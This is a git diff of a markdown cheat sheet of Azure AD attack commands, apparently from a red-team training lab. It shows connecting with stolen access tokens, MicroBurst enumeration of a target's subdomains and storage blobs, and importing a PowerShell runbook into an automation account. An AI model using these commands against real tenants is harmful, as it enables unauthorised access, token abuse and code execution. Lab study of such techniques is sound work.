@@ -165,25 +165,6 @@ Now you can connect; ```-AccountID``` is victimID you stole the tokens from:
 Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
 ```
 
-
-## Scripts
-#### Subdomains:
-```
-. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1 
-Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
-```
-
-
-
-#### Storage Blobs:
-
-- We can also add permutations like common, backup, code to ```permutations.txt``` in ```C:\AzAD\Tools\Microburst\Misc``` to tune it for the specific domain we are targetting\
-- If the browser doesnt allow you access to the referenced blob try using Azure Storage Explorer GUI!
-```
-. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1 
-Invoke-EnumerateAzureBlobs -Base defcorp
-```
-
 # API Call
 ```
 $token=''
@@ -223,3 +204,29 @@ Applications
 App Registrations
 Service Principals
 ```
+
+
+## Scripts
+#### Subdomains:
+```
+. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1 
+Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
+```
+
+
+
+#### Storage Blobs:
+
+- We can also add permutations like common, backup, code to ```permutations.txt``` in ```C:\AzAD\Tools\Microburst\Misc``` to tune it for the specific domain we are targetting\
+- If the browser doesnt allow you access to the referenced blob try using Azure Storage Explorer GUI!
+```
+. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1 
+Invoke-EnumerateAzureBlobs -Base defcorp
+```
+
+## Runbooks
+
+```
+Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
+```
+
